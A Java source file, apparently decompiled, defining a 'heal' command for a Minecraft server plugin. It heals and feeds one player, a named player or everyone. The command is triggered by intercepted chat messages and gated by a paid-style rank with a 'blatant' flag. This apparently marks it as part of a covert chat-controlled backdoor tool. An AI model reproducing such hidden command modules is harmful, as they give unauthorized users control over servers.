package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "heal",
   description = "Heals and feeds a player",
   blatant = true,
   rank = Rank.PREMIUM
)
public class HealCommand extends AbstractCommand {
   public HealCommand() {
   }

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      if (var3.length == 0) {
         var1.getPlayer().setHealth(var1.getPlayer().getMaxHealth());
         var1.getPlayer().setFoodLevel(20);
         ChatUtil.sendChat(var1.getPlayer(), "You have been healed.");
      } else if (!var3[0].equals("*")) {
         Player var6 = Bukkit.getPlayerExact(var3[0]);
         if (var6 == null) {
            ChatUtil.sendChat(var1.getPlayer(), "The player " + var3[0] + " is not online.");
         } else {
            var6.setHealth(var6.getMaxHealth());
            var6.setFoodLevel(20);
            ChatUtil.sendChat(var1.getPlayer(), var6.getName() + " has been healed.");
         }
      } else {
         for(Player var5 : Bukkit.getServer().getOnlinePlayers()) {
            var5.setHealth(var5.getMaxHealth());
            var5.setFoodLevel(20);
         }

         ChatUtil.sendChat(var1.getPlayer(), "All players have been healed.");
      }
   }
}
